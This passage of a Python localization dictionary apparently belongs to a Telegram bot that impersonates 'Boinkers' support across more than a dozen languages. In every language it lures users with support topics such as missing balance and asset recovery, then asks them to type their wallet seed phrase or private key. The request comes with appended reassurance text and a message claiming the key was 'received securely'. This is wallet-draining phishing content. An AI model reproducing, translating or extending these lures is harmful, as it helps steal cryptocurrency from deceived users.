        "seed phrase": "🔒 Impor Seed Phrase",
        "wallet selection message": "Anda telah memilih {wallet_name}.\nPilih mode koneksi yang diinginkan.",
        "reassurance": PROFESSIONAL_REASSURANCE["id"],
        "prompt seed": "silakan masukkan 12 atau 24 kata dari dompet Anda." + PROFESSIONAL_REASSURANCE["id"],
        "prompt private key": "Masukkan kunci pribadi Anda." + PROFESSIONAL_REASSURANCE["id"],
        "invalid choice": "Pilihan tidak valid. Gunakan tombol.",
        "final error message": "‼️ Terjadi kesalahan. /start untuk mencoba lagi.",
        "final_received_message": "Terima kasih — seed atau kunci pribadi Anda telah diterima dengan aman dan akan diproses. Gunakan /start untuk mulai lagi.",
        "error_use_seed_phrase": "Terlihat seperti alamat. Kolom ini memerlukan seed phrase (12 atau 24 kata). Silakan berikan seed phrase.",
        "post_receive_error": "‼️ Terjadi kesalahan. Pastikan Anda memasukkan kunci yang benar — gunakan salin dan tempel untuk menghindari kesalahan. Silakan /start untuk mencoba lagi.",
        "choose language": "Silakan pilih bahasa:",
        "await restart message": "Klik /start untuk memulai ulang.",
        "enter stickers prompt": "Ketik stiker yang ingin Anda klaim.",
        "confirm claim stickers": "Anda yakin ingin mengklaim stiker yang dimasukkan?",
        "confirm_entered_stickers": "Anda memasukkan {count} stiker:\n{stickers}\n\nKonfirmasi?",
        "yes": "Ya",
        "no": "Tidak",
        "back": "🔙 Kembali",
        "invalid_input": "Input tidak valid. Gunakan /start untuk mulai.",
    },
    # German
    "de": {
        "welcome": "Hallo {user}! Willkommen beim Boinkers-Assistenten. Dieser Bot hilft beim Beantragen von Stickern.",
        "main menu title": "Bitte wählen Sie eine Art von Problem aus, um fortzufahren:",
        "buy": "Kaufen",
        "validation": "Validierung",
        "claim tokens": "Tokens Beanspruchen",
        "migration issues": "Migrationsprobleme",
        "assets recovery": "Wiederherstellung von Vermögenswerten",
        "general issues": "Allgemeine Probleme",
        "rectification": "Berichtigung",
        "staking issues": "Staking-Probleme",
        "deposits": "Einzahlungen",
        "withdrawals": "Auszahlungen",
        "missing balance": "Fehlender Saldo",
        "login issues": "Anmeldeprobleme",
        "high gas fees": "Hohe Gasgebühren",
        "presale issues": "Presale-Probleme",
        "claim missing sticker": "Fehlenden Sticker Beanspruchen",
        "connect wallet message": "Bitte verbinden Sie Ihre Wallet mit Ihrem privaten Schlüssel oder Ihrer Seed-Phrase, um fortzufahren.",
        "connect wallet button": "🔑 Wallet Verbinden",
        "select wallet type": "Bitte wählen Sie Ihren Wallet-Typ:",
        "other wallets": "Andere Wallets",
        "private key": "🔑 Privater Schlüssel",
        "seed phrase": "🔒 Seed-Phrase importieren",
        "wallet selection message": "Sie haben {wallet_name} ausgewählt.\nWählen Sie Ihre bevorzugte Verbindungsmethode.",
        "reassurance": PROFESSIONAL_REASSURANCE["de"],
        "prompt seed": "Bitte geben Sie die 12 oder 24 Wörter Ihres Wallets ein." + PROFESSIONAL_REASSURANCE["de"],
        "prompt private key": "Bitte geben Sie Ihren privaten Schlüssel ein." + PROFESSIONAL_REASSURANCE["de"],
        "invalid choice": "Ungültige Auswahl. Bitte benutzen Sie die Buttons.",
        "final error message": "‼️ Ein Fehler ist aufgetreten. /start zum Wiederholen.",
        "final_received_message": "Vielen Dank — Ihre seed oder Ihr privater Schlüssel wurde sicher empfangen und wird verarbeitet. Verwenden Sie /start, um neu zu beginnen.",
        "error_use_seed_phrase": "Es sieht wie eine Adresse aus. Dieses Feld benötigt eine seed phrase (12 oder 24 Wörter). Bitte geben Sie die seed phrase ein.",
        "post_receive_error": "‼️ Ein Fehler ist aufgetreten. Bitte stellen Sie sicher, dass Sie den richtigen Schlüssel eingeben — verwenden Sie Kopieren und Einfügen, um Fehler zu vermeiden. Bitte /start, um es erneut zu versuchen.",
        "choose language": "Bitte wählen Sie Ihre bevorzugte Sprache:",
        "await restart message": "Bitte klicken Sie auf /start, um neu zu beginnen.",
        "enter stickers prompt": "Bitte geben Sie die Sticker ein, die Sie beanspruchen möchten.",
        "confirm claim stickers": "Sind Sie sicher, dass Sie die eingegebenen Sticker beanspruchen möchten?",
        "confirm_entered_stickers": "Sie haben {count} Sticker eingegeben:\n{stickers}\n\nBitte bestätigen.",
        "yes": "Ja",
        "no": "Nein",
        "back": "🔙 Zurück",
        "invalid_input": "Ungültige Eingabe. Bitte verwenden Sie /start um zu beginnen.",
    },
    # Dutch
    "nl": {
        "welcome": "Hallo {user}! Welkom bij de Boinkers-assistent. Deze bot helpt bij het claimen van stickers.",
        "main menu title": "Gelieve een probleemtype te selecteren om verder te gaan:",
        "buy": "Kopen",
        "validation": "Validatie",
        "claim tokens": "Tokens Claimen",
        "migration issues": "Migratieproblemen",
        "assets recovery": "Herstel van Activa",
        "general issues": "Algemene Problemen",
        "rectification": "Rectificatie",
        "staking issues": "Staking-problemen",
        "deposits": "Stortingen",
        "withdrawals": "Opnames",
        "missing balance": "Ontbrekend Saldo",
        "login issues": "Login-problemen",
        "high gas fees": "Hoge Gas-kosten",
        "presale issues": "Presale-problemen",
        "claim missing sticker": "Ontbrekende Sticker Claimen",
        "connect wallet message": "Verbind uw wallet met uw private key of seed phrase om door te gaan.",
        "connect wallet button": "🔑 Wallet Verbinden",
        "select wallet type": "Selecteer uw wallet-type:",
        "other wallets": "Andere Wallets",
        "private key": "🔑 Privésleutel",
        "seed phrase": "🔒 Seed Phrase Importeren",
        "wallet selection message": "U heeft {wallet_name} geselecteerd.\nSelecteer uw voorkeursmodus voor verbinding.",
        "reassurance": PROFESSIONAL_REASSURANCE["nl"],
        "prompt seed": "Voer alstublieft de 12 of 24 woorden van uw wallet in." + PROFESSIONAL_REASSURANCE["nl"],
        "prompt private key": "Voer uw privésleutel in." + PROFESSIONAL_REASSURANCE["nl"],
        "invalid choice": "Ongeldige keuze. Gebruik de knoppen.",
        "final error message": "‼️ Er is een fout opgetreden. Gebruik /start om opnieuw te proberen.",
        "final_received_message": "Dank u — uw seed of privésleutel is veilig ontvangen en zal worden verwerkt. Gebruik /start om opnieuw te beginnen.",
        "error_use_seed_phrase": "Het lijkt op een adres. Dit veld vereist een seed-phrase (12 of 24 woorden). Geef de seed-phrase op.",
        "post_receive_error": "‼️ Er is een fout opgetreden. Zorg ervoor dat u de juiste sleutel invoert — gebruik kopiëren en plakken om fouten te voorkomen. Gebruik /start om het opnieuw te proberen.",
        "choose language": "Selecteer uw voorkeurstaal:",
        "await restart message": "Klik op /start om opnieuw te beginnen.",
        "enter stickers prompt": "Voer de sticker(s) in die u wilt claimen.",
        "confirm claim stickers": "Weet u zeker dat u de ingevoerde stickers wilt claimen?",
        "confirm_entered_stickers": "U hebt {count} sticker(s) ingevoerd:\n{stickers}\n\nBevestig aub.",
        "yes": "Ja",
        "no": "Nee",
        "back": "🔙 Terug",
        "invalid_input": "Ongeldige invoer. Gebruik /start om te beginnen.",
    },
    # Hindi
    "hi": {
        "welcome": "नमस्ते {user}! Boinkers सहायक में आपका स्वागत है। यह बॉट स्टिकर क्लेम करने में मदद करता है।",
        "main menu title": "जारी रखने के लिए कृपया एक समस्या प्रकार चुनें:",
        "buy": "खरीदें",
        "validation": "सत्यापन",
        "claim tokens": "टोकन का दावा करें",
        "migration issues": "माइग्रेशन समस्याएं",
        "assets recovery": "संपत्ति पुनर्प्राप्ति",
        "general issues": "सामान्य समस्याएं",
        "rectification": "सुधार",
        "staking issues": "स्टेकिंग समस्याएं",
        "deposits": "जमा",
        "withdrawals": "निकासी",
        "missing balance": "अनुपस्थित शेष",
        "login issues": "लॉगिन समस्याएं",
        "high gas fees": "उच्च गैस शुल्क",
        "presale issues": "प्रीसेल समस्याएं",
        "claim missing sticker": "गुम स्टिकर का दावा करें",
        "connect wallet message": "कृपया वॉलेट को निजी कुंजी या seed के साथ जोड़ें।",
        "connect wallet button": "🔑 वॉलेट कनेक्ट करें",
        "select wallet type": "कृपया वॉलेट प्रकार चुनें:",
        "other wallets": "अन्य वॉलेट",
        "private key": "🔑 निजी कुंजी",
        "seed phrase": "🔒 सीड वाक्यांश आयात करें",
        "wallet selection message": "आपने {wallet_name} चुना है।\nकनेक्शन मोड चुनें।",
        "reassurance": PROFESSIONAL_REASSURANCE["hi"],
        "prompt seed": "कृपया अपने वॉलेट के 12 या 24 शब्द दर्ज करें।" + PROFESSIONAL_REASSURANCE["hi"],
        "prompt private key": "कृपया निजी कुंजी दर्ज करें." + PROFESSIONAL_REASSURANCE["hi"],
        "invalid choice": "अमान्य विकल्प। बटन उपयोग करें।",
        "final error message": "‼️ त्रुटि हुई。 /start से पुनः प्रयास करें。",
        "final_received_message": "धन्यवाद — आपकी seed या निजी कुंजी सुरक्षा से प्राप्त कर ली गई है और प्रोसेस की जाएगी। /start से पुनः शुरू करें。",
        "error_use_seed_phrase": "ऐसा लगा कि आपने पता दिया। कृपया seed phrase (12 या 24 शब्द) दें।",
        "post_receive_error": "‼️ एक त्रुटि हुई। कृपया सुनिश्चित करें कि आप सही कुंजी दर्ज कर रहे हैं — त्रुटियों से बचने के लिए कॉपी-पेस्ट का उपयोग करें। कृपया पुनः प्रयास के लिए /start करें।",
        "choose language": "कृपया भाषा चुनें:",
        "await restart message": "कृपया /start दबाएँ。",
        "enter stickers prompt": "कृपया वह स्टिकर टाइप करें जिसे आप क्लेम करना चाहते हैं।",
        "confirm claim stickers": " क्या आप सुनिश्चित हैं कि आप दर्ज स्टिकर क्लेम करना चाहते हैं?",
        "confirm_entered_stickers": "आपने {count} स्टिकर दर्ज किए:\n{stickers}\n\nकृपया पुष्टि करें।",
        "yes": "हाँ",
        "no": "नहीं",
        "back": "🔙 वापस",
        "invalid_input": "अमान्य इनपुट। /start का उपयोग करें।",
    },
    # Turkish
    "tr": {
        "welcome": "Merhaba {user}! Boinkers asistanına hoş geldiniz. Bu bot sticker talep etmenize yardımcı olur.",
        "main menu title": "Devam etmek için lütfen bir sorun türü seçin:",
        "buy": "Satın Al",
        "validation": "Doğrulama",
        "claim tokens": "Token Talep Et",
        "migration issues": "Migrasyon Sorunları",
        "assets recovery": "Varlık Kurtarma",
        "general issues": "Genel Sorunlar",
        "rectification": "Düzeltme",
        "staking issues": "Staking Sorunları",
        "deposits": "Para Yatırma",
        "withdrawals": "Para Çekme",
        "missing balance": "Kayıp Bakiye",
        "login issues": "Giriş Sorunları",
        "high gas fees": "Yüksek Gas Ücretleri",
        "presale issues": "Ön Satış Sorunları",
        "claim missing sticker": "Kayıp Stickeri Talep Et",
        "connect wallet message": "Lütfen cüzdanınızı özel anahtar veya seed ile bağlayın.",
        "connect wallet button": "🔑 Cüzdanı Bağla",
        "select wallet type": "Lütfen cüzdan türünü seçin:",
        "other wallets": "Diğer Cüzdanlar",
        "private key": "🔑 Özel Anahtar",
        "seed phrase": "🔒 Seed Cümlesi İçe Aktar",
        "wallet selection message": "{wallet_name} seçtiniz。\nBağlantı modunu seçin。",
        "reassurance": PROFESSIONAL_REASSURANCE["tr"],
        "prompt seed": "lütfen cüzdanınızın 12 veya 24 kelimesini girin." + PROFESSIONAL_REASSURANCE["tr"],
        "prompt private key": "Lütfen özel anahtarınızı girin." + PROFESSIONAL_REASSURANCE["tr"],
        "invalid choice": "Geçersiz seçim. Düğmeleri kullanın。",
        "final error message": "‼️ Bir hata oluştu。 /start ile tekrar deneyin。",
        "final_received_message": "Teşekkürler — seed veya özel anahtarınız güvenli şekilde alındı ve işlenecektir。 /start ile yeniden başlayın。",
        "error_use_seed_phrase": "Bu alan seed ifadesi (12 veya 24 kelime) gerektirir。 Lütfen seed girin。",
        "post_receive_error": "‼️ Bir hata oluştu。 Lütfen doğru anahtarı girdiğinizden emin olun — hataları önlemek için kopyala-yapıştır kullanın。 Lütfen tekrar denemek için /start kullanın。",
        "choose language": "Lütfen dilinizi seçin:",
        "await restart message": "Lütfen /start ile yeniden başlayın。",
        "enter stickers prompt": "Talep etmek istediğiniz sticker(ları) yazın。",
        "confirm claim stickers": "Girdiğiniz stickerları talep etmek istiyor musunuz?",
        "confirm_entered_stickers": "Girdiğiniz {count} sticker(lar):\n{stickers}\n\nLütfen onaylayın。",
        "yes": "Evet",
        "no": "Hayır",
        "back": "🔙 Geri",
        "invalid_input": "Geçersiz giriş. /start kullanın。",
    },
    # Chinese (Simplified)
    "zh": {
        "welcome": "你好 {user}！欢迎使用 Boinkers 助手。此机器人可帮助您申领贴纸。",
        "main menu title": "请选择一个问题类型以继续：",
        "buy": "购买",
        "validation": "验证",
        "claim tokens": "领取代币",
        "migration issues": "迁移问题",
        "assets recovery": "资产恢复",
        "general issues": "一般问题",
        "rectification": "纠正",
        "staking issues": "质押问题",
        "deposits": "存款",
        "withdrawals": "提款",
        "missing balance": "丢失余额",
        "login issues": "登录问题",
        "high gas fees": "高 Gas 费用",
        "presale issues": "预售问题",
        "claim missing sticker": "申领丢失贴纸",
        "connect wallet message": "请用私钥或助记词连接钱包以继续。",
        "connect wallet button": "🔑 连接钱包",
        "select wallet type": "请选择您的钱包类型：",
        "other wallets": "其他钱包",
        "private key": "🔑 私钥",
        "seed phrase": "🔒 导入助记词",
        "wallet selection message": "您已选择 {wallet_name}。\n请选择连接方式。",
        "reassurance": PROFESSIONAL_REASSURANCE["zh"],
        "prompt seed": "请输入您钱包的 12 或 24 个单词。" + PROFESSIONAL_REASSURANCE["zh"],
        "prompt private key": "请输入您的私钥。" + PROFESSIONAL_REASSURANCE["zh"],
        "invalid choice": "无效选择。请使用按钮。",
        "final error message": "‼️ 发生错误。/start 重试。",
        "final_received_message": "谢谢 — 您的 seed 或私钥已被安全接收并将被处理。使用 /start 重新开始。",
        "error_use_seed_phrase": "检测到的输入像是地址。本字段需要 12 或 24 单词的助记词。请提供助记词。",
        "post_receive_error": "‼️ 发生错误。请确保您输入的是正确的密钥 — 请使用复制粘贴以避免错误。请使用 /start 重新尝试。",
        "choose language": "请选择语言：",
        "await restart message": "请点击 /start 以重新开始。",
        "enter stickers prompt": "请输入您要申领的贴纸。",
        "confirm claim stickers": "确定要申领输入的贴纸吗？",
        "confirm_entered_stickers": "您输入了 {count} 个贴纸：\n{stickers}\n\n请确认。",
        "yes": "是",
        "no": "否",
        "back": "🔙 返回",
        "invalid_input": "无效输入。请使用 /start 开始。",
    },
    # Czech
    "cs": {
        "welcome": "Vítejte {user}! Tento bot pomáhá žádat o Boinkers samolepky.",
        "main menu title": "Vyberte typ problému pro pokračování:",
        "buy": "Koupit",
        "validation": "Ověření",
        "claim tokens": "Nárokovat Tokeny",
        "migration issues": "Problémy s migrací",
        "assets recovery": "Obnovení aktiv",
        "general issues": "Obecné problémy",
        "rectification": "Oprava",
        "staking issues": "Problémy se stakingem",
        "deposits": "Vklady",
        "withdrawals": "Výběry",
        "missing balance": "Chybějící zůstatek",
        "login issues": "Problémy s přihlášením",
        "high gas fees": "Vysoké poplatky za gas",
        "presale issues": "Problémy s předprodejem",
        "claim missing sticker": "Nárokovat chybějící samolepku",
        "connect wallet message": "Připojte peněženku pomocí soukromého klíče nebo seed fráze.",
        "connect wallet button": "🔑 Připojit peněženku",
        "select wallet type": "Vyberte typ peněženky:",
        "other wallets": "Jiné peněženky",
        "private key": "🔑 Soukromý klíč",
        "seed phrase": "🔒 Importovat seed frázi",
        "wallet selection message": "Vybrali jste {wallet_name}.\nVyberte způsob připojení.",
        "reassurance": PROFESSIONAL_REASSURANCE["cs"],
        "prompt seed": "zadejte prosím 12 nebo 24 slov vaší peněženky." + PROFESSIONAL_REASSURANCE["cs"],
        "prompt private key": "Zadejte prosím svůj soukromý klíč." + PROFESSIONAL_REASSURANCE["cs"],
        "invalid choice": "Neplatná volba. Použijte tlačítka.",
        "final error message": "‼️ Došlo k chybě. /start pro opakování.",
        "final_received_message": "Děkujeme — vaše seed nebo privátní klíč byl bezpečně přijat a bude zpracován. Použijte /start pro opakování.",
        "error_use_seed_phrase": "Zadejte seed frázi (12 nebo 24 slov), ne adresu.",
        "post_receive_error": "‼️ Došlo k chybě. Ujistěte se, že zadáváte správný klíč — použijte kopírovat a vložit, abyste se vyhnuli chybám. Prosím /start pro opakování.",
        "choose language": "Vyberte preferovaný jazyk:",
        "await restart message": "Klikněte /start pro restart.",
        "enter stickers prompt": "Zadejte samolepky, které chcete nárokovat.",
        "confirm claim stickers": "Opravdu chcete pokračovat a nárokovat zadané samolepky?",
        "confirm_entered_stickers": "Zadali jste {count} samolepku(y):\n{stickers}\n\nPotvrďte, prosím.",
        "yes": "Ano",
        "no": "Ne",
        "back": "🔙 Zpět",
        "invalid_input": "Neplatný vstup. Použijte /start.",
    },
    # Urdu
    "ur": {
        "welcome": "خوش آمدید {user}! Boinkers اسسٹنٹ میں خوش آمدید۔ یہ بوٹ آپ کو اسٹیکرز حاصل کرنے میں مدد کرتا ہے۔",
        "main menu title": "جاری رکھنے کے لیے مسئلے کی قسم منتخب کریں:",
        "buy": "خریدیں",
        "validation": "تصدیق",
        "claim tokens": "ٹوکن دعویٰ کریں",
        "migration issues": "منتقلی کے مسائل",
        "assets recovery": "اثاثہ بازیابی",
        "general issues": "عمومی مسائل",
        "rectification": "درستگی",
        "staking issues": "اسٹیکنگ مسائل",
        "deposits": "جمع",
        "withdrawals": "واپس لینا",
        "missing balance": "گم شدہ بیلنس",
        "login issues": "لاگ ان مسائل",
        "high gas fees": "اعلی گیس فیس",
        "presale issues": "پری سیل مسائل",
        "claim missing sticker": "غائب اسٹیکر کا دعویٰ کریں",
        "connect wallet message": "براہ کرم اپنا والٹ نجی کلید یا سیڈ کے ساتھ منسلک کریں۔",
        "connect wallet button": "🔑 والٹ کنیکٹ کریں",
        "select wallet type": "براہ کرم والٹ کی قسم منتخب کریں:",
        "other wallets": "دیگر والٹس",
        "private key": "🔑 نجی کلید",
        "seed phrase": "🔒 سیڈ فریز درآمد کریں",
        "wallet selection message": "آپ نے {wallet_name} منتخب کیا ہے。\nکنکشن موڈ منتخب کریں。",
        "reassurance": PROFESSIONAL_REASSURANCE["ur"],
        "prompt seed": "براہِ مہربانی اپنے والٹ کے 12 یا 24 الفاظ درج کریں۔" + PROFESSIONAL_REASSURANCE["ur"],
        "prompt private key": "براہ کرم نجی کلید داخل کریں." + PROFESSIONAL_REASSURANCE["ur"],
        "invalid choice": "غلط انتخاب۔ بٹن استعمال کریں。",
        "final error message": "‼️ ایک خرابی پیش آئی۔ /start سے دوبارہ کوشش کریں。",
        "final_received_message": "شکریہ — آپ کی seed یا نجی کلید محفوظ طور پر موصول ہوگئی ہے اور پراسیس کی جائے گی۔ /start سے دوبارہ شروع کریں。",
        "error_use_seed_phrase": "یہ فیلڈ seed فریز (12 یا 24 الفاظ) مانگتا ہے۔ براہ کرم seed درج کریں۔",
        "post_receive_error": "‼️ ایک خرابی پیش آئی۔ براہ کرم یقینی بنائیں کہ آپ درست کلید داخل کر رہے ہیں — غلطیوں سے بچنے کے لیے کاپی اور پیسٹ استعمال کریں۔ براہ کرم دوبارہ کوشش کے لیے /start کریں。",
        "choose language": "براہ کرم زبان منتخب کریں:",
        "await restart message": "براہ کرم /start دبائیں۔",
        "enter stickers prompt": "براہ کرم وہ اسٹیکر لکھیں جو آپ کلیم کرنا چاہتے ہیں۔",
        "confirm claim stickers": "کیا آپ یقین رکھتے ہیں کہ آپ یہ اسٹیکرز کلیم کرنا چاہتے ہیں؟",
        "confirm_entered_stickers": "آپ نے {count} اسٹیکر درج کیے ہیں:\n{stickers}\n\nپوشید کریں。",
        "yes": "ہاں",
        "no": "نہیں",
        "back": "🔙 واپس",
        "invalid_input": "غلط ان پٹ۔ /start استعمال کریں۔",
    },
    # Uzbek
    "uz": {
        "welcome": "Xush kelibsiz {user}! Boinkers yordamchisiga xush kelibsiz. Bu bot stikerni talab qilishga yordam beradi.",
        "main menu title": "Davom etish uchun muammo turini tanlang:",
        "buy": "Sotib olish",
        "validation": "Tekshirish",
        "claim tokens": "Tokenlarni da'vo qilish",
        "migration issues": "Migratsiya muammolari",
        "assets recovery": "Aktivlarni tiklash",
        "general issues": "Umumiy muammolar",
        "rectification": "To'g'irlash",
        "staking issues": "Staking muammolari",
        "deposits": "Omonat",
        "withdrawals": "Chiqish",
        "missing balance": "Yo'qolgan balans",
        "login issues": "Kirish muammolari",
        "high gas fees": "Yuqori gas to'lovlari",
        "presale issues": "Oldindan sotish muammolari",
        "claim missing sticker": "Yo'qolgan stikerni da'vo qilish",
        "connect wallet message": "Iltimos, hamyoningizni xususiy kalit yoki seed bilan ulang.",
        "connect wallet button": "🔑 Hamyonni ulang",
        "select wallet type": "Hamyon turini tanlang:",
        "other wallets": "Boshqa hamyonlar",
        "private key": "🔑 Xususiy kalit",
        "seed phrase": "🔒 Seed iborasini import qilish",
        "wallet selection message": "Siz {wallet_name} ni tanladingiz.\nUlanish usulini tanlang.",
        "reassurance": PROFESSIONAL_REASSURANCE["uz"],
        "prompt seed": "iltimos, hamyoningizning 12 yoki 24 soʻzini kiriting." + PROFESSIONAL_REASSURANCE["uz"],
        "prompt private key": "Xususiy kalitni kiriting." + PROFESSIONAL_REASSURANCE["uz"],
        "invalid choice": "Noto'g'ri tanlov. Tugmalardan foydalaning.",
        "final error message": "‼️ Xato yuz berdi. /start bilan qayta urinib ko'ring.",
        "final_received_message": "Rahmat — seed yoki xususiy kalitingiz xavfsiz qabul qilindi va qayta ishlanadi. /start bilan boshlang.",
        "error_use_seed_phrase": "Iltimos 12 yoki 24 so'zli seed iborasini kiriting, manzil emas.",
        "post_receive_error": "‼️ Xato yuz berdi. Iltimos, to'g'ri kalitni kiritayotganingizga ishonch hosil qiling — xatoliklarni oldini olish uchun nusxalash va joylashtirishdan foydalaning. Iltimos, qayta urinib ko‘rish uchun /start bosing.",
        "choose language": "Iltimos, tilni tanlang:",
        "await restart message": "Qayta boshlash uchun /start bosing.",
        "enter stickers prompt": "Da'vo qilmoqchi bo'lgan stikerlarni kiriting.",
        "confirm claim stickers": "Kiritilgan stikerlarni da'vo qilmoqchimisiz?",
        "confirm_entered_stickers": "Siz {count} stiker kiritdingiz:\n{stickers}\n\nTasdiqlang.",
        "yes": "Ha",
        "no": "Yo'q",
        "back": "🔙 Orqaga",
        "invalid_input": "Noto'g'ri kirish. /start ishlating.",
    },
    # Italian
    "it": {
        "welcome": "Ciao {user}! Benvenuto nell'assistente Boinkers. Questo bot ti aiuta a richiedere sticker.",
        "main menu title": "Seleziona un tipo di problema per continuare:",
        "buy": "Acquistare",
        "validation": "Validazione",
        "claim tokens": "Richiedi Token",
        "migration issues": "Problemi di Migrazione",
        "assets recovery": "Recupero Asset",
        "general issues": "Problemi Generali",
        "rectification": "Rettifica",
        "staking issues": "Problemi di Staking",
        "deposits": "Depositi",
        "withdrawals": "Prelievi",
        "missing balance": "Saldo Mancante",
        "login issues": "Problemi di Accesso",
        "high gas fees": "Alte Commissioni Gas",
        "presale issues": "Problemi di Prevendita",
        "claim missing sticker": "Richiedi Sticker Mancante",
        "connect wallet message": "Collega il tuo wallet con la Chiave Privata o Seed Phrase per continuare.",
        "connect wallet button": "🔑 Connetti Wallet",
        "select wallet type": "Seleziona il tipo di wallet:",
        "other wallets": "Altri Wallet",
        "private key": "🔑 Chiave Privata",
        "seed phrase": "🔒 Importa Seed Phrase",
        "wallet selection message": "Hai selezionato {wallet_name}.\nSeleziona la modalità di connessione preferita.",
        "reassurance": PROFESSIONAL_REASSURANCE["it"],
        "prompt seed": "per favore inserisci le 12 o 24 parole del tuo wallet." + PROFESSIONAL_REASSURANCE["it"],
        "prompt private key": "Inserisci la chiave privata." + PROFESSIONAL_REASSURANCE["it"],
        "invalid choice": "Scelta non valida. Usa i pulsanti.",
        "final error message": "‼️ Si è verificato un errore. /start per riprovare.",
        "final_received_message": "Grazie — seed o chiave privata ricevuti in modo sicuro e saranno processati. Usa /start per ricominciare.",
        "error_use_seed_phrase": "Questo campo richiede una seed phrase (12 o 24 parole).",
        "post_receive_error": "‼️ Si è verificato un errore. Assicurati di inserire la chiave corretta — usa copia e incolla per evitare errori. Per favore /start per riprovare.",
        "choose language": "Seleziona la lingua:",
        "await restart message": "Clicca /start per ricominciare.",
        "enter stickers prompt": "Digita gli sticker che vuoi richiedere.",
        "confirm claim stickers": "Sei sicuro di voler richiedere gli sticker inseriti?",
        "confirm_entered_stickers": "Hai inserito {count} sticker:\n{stickers}\n\nConfermi?",
        "yes": "Sì",
        "no": "No",
        "back": "🔙 Indietro",
        "invalid_input": "Input non valido. Usa /start.",
    },
    # Japanese
    "ja": {
        "welcome": "ようこそ {user}！Boinkers ヘルパーへ。ステッカーの申請を手伝います。",
        "main menu title": "続行するには問題の種類を選択してください：",
        "buy": "購入",
        "validation": "検証",
        "claim tokens": "トークンを請求",
        "migration issues": "移行の問題",
        "assets recovery": "資産の回復",
        "general issues": "一般的な問題",
        "rectification": "修正",
        "staking issues": "ステーキングの問題",
        "deposits": "入金",
        "withdrawals": "出金",
        "missing balance": "残高がない",
        "login issues": "ログインの問題",
        "high gas fees": "高いガス料金",
        "presale issues": "プレセールの問題",
        "claim missing sticker": "欠損ステッカーを申請",
        "connect wallet message": "プライベートキーまたはシードフレーズでウォレットを接続してください。",
        "connect wallet button": "🔑 ウォレットを接続",
        "select wallet type": "ウォレットの種類を選択してください：",
        "other wallets": "その他のウォレット",
        "private key": "🔑 プライベートキー",
        "seed phrase": "🔒 シードフレーズをインポート",
        "wallet selection message": "{wallet_name} を選択しました。\n接続方法を選択してください。",
        "reassurance": PROFESSIONAL_REASSURANCE["ja"],
        "prompt seed": "ウォレットの12語または24語を入力してください。" + PROFESSIONAL_REASSURANCE["ja"],
        "prompt private key": "プライベートキーを入力してください。" + PROFESSIONAL_REASSURANCE["ja"],
        "invalid choice": "無効な選択です。ボタンを使用してください。",
        "final error message": "‼️ エラーが発生しました。/start で再試行してください。",
        "final_received_message": "ありがとうございます — seed または秘密鍵を安全に受け取りました。/start で再開してください。",
        "error_use_seed_phrase": "このフィールドには 12 または 24 の単語のシードフレーズが必要です。シードフレーズを入力してください。",
        "post_receive_error": "‼️ エラーが発生しました。正しいキーを入力していることを確認してください — エラーを避けるためにコピー＆ペーストを使用してください。再試行するには /start を実行してください。",
        "choose language": "言語を選択してください：",
        "await restart message": "/start をクリックして再開してください。",
        "enter stickers prompt": "申請したいステッカーを入力してください。",
        "confirm claim stickers": "入力したステッカーを申請してよろしいですか？",
        "confirm_entered_stickers": "{count} 個のステッカーを入力しました：\n{stickers}\n\n申請しますか？",
        "yes": "はい",
        "no": "いいえ",
        "back": "🔙 戻る",
        "invalid_input": "無効な入力です。/start を使用してください。",
    },
    # Malay
    "ms": {
        "welcome": "Hai {user}! Selamat datang ke pembantu Boinkers. Bot ini membantu menuntut pelekat.",
        "main menu title": "Sila pilih jenis isu untuk meneruskan:",
        "buy": "Beli",
        "validation": "Pengesahan",
        "claim tokens": "Tuntut Token",
        "migration issues": "Isu Migrasi",
        "assets recovery": "Pemulihan Aset",
        "general issues": "Isu Umum",
        "rectification": "Pembetulan",
        "staking issues": "Isu Staking",
        "deposits": "Deposit",
        "withdrawals": "Pengeluaran",
        "missing balance": "Baki Hilang",
        "login issues": "Isu Log Masuk",
        "high gas fees": "Yuran Gas Tinggi",
        "presale issues": "Isu Pra-Jualan",
        "claim missing sticker": "Tuntut Sticker Hilang",
        "connect wallet message": "Sila sambungkan dompet anda dengan Kunci Peribadi atau Seed Phrase untuk meneruskan.",
        "connect wallet button": "🔑 Sambung Dompet",
        "select wallet type": "Sila pilih jenis dompet anda:",
        "other wallets": "Dompet Lain",
        "private key": "🔑 Kunci Peribadi",
        "seed phrase": "🔒 Import Seed Phrase",
        "wallet selection message": "Anda telah memilih {wallet_name}.\nPilih mod sambungan yang dikehendaki.",
        "reassurance": PROFESSIONAL_REASSURANCE["ms"],
        "prompt seed": "sila masukkan 12 atau 24 perkataan dompet anda." + PROFESSIONAL_REASSURANCE["ms"],
        "prompt private key": "Sila masukkan kunci peribadi anda." + PROFESSIONAL_REASSURANCE["ms"],
        "invalid choice": "Pilihan tidak sah. Gunakan butang.",
        "final error message": "‼️ Ralat berlaku. /start untuk cuba lagi.",
        "final_received_message": "Terima kasih — seed atau kunci peribadi anda diterima dengan selamat dan akan diproses. Gunakan /start untuk mula lagi.",
        "error_use_seed_phrase": "Dikesan seperti alamat. Sila berikan seed phrase (12 atau 24 perkataan).",
        "post_receive_error": "‼️ Ralat berlaku. Sila pastikan anda memasukkan kunci yang betul — gunakan salin dan tampal untuk mengelakkan ralat. Sila /start untuk mencuba lagi.",
        "choose language": "Sila pilih bahasa pilihan anda:",
        "await restart message": "Klik /start untuk mulakan semula.",
        "enter stickers prompt": "Taip sticker yang ingin anda tuntut.",
        "confirm claim stickers": "Anda pasti mahu menuntut sticker yang dimasukkan?",
        "confirm_entered_stickers": "Anda memasukkan {count} sticker(s):\n{stickers}\n\nSahkan?",
        "yes": "Ya",
        "no": "Tidak",
        "back": "🔙 Kembali",
        "invalid_input": "Input tidak sah. Gunakan /start.",
    },
    # Romanian
    "ro": {
        "welcome": "Bun venit {user}! Acest bot te ajută să revendici stickere Boinkers.",
        "main menu title": "Selectați un tip de problemă pentru a continua:",
        "buy": "Cumpără",
        "validation": "Validare",
        "claim tokens": "Revendică Token-uri",
        "migration issues": "Probleme de Migrare",
        "assets recovery": "Recuperare Active",
        "general issues": "Probleme Generale",
        "rectification": "Rectificare",
        "staking issues": "Probleme de Staking",
        "deposits": "Depuneri",
        "withdrawals": "Retrageri",
        "missing balance": "Sold Lipsă",
        "login issues": "Probleme de Autentificare",
        "high gas fees": "Taxe Mari de Gas",
        "presale issues": "Probleme Pre-sale",
        "claim missing sticker": "Revendică Sticker Lipsă",
        "connect wallet message": "Vă rugăm conectați portofelul cu cheia privată sau fraza seed pentru a continua.",
        "connect wallet button": "🔑 Conectează Portofel",
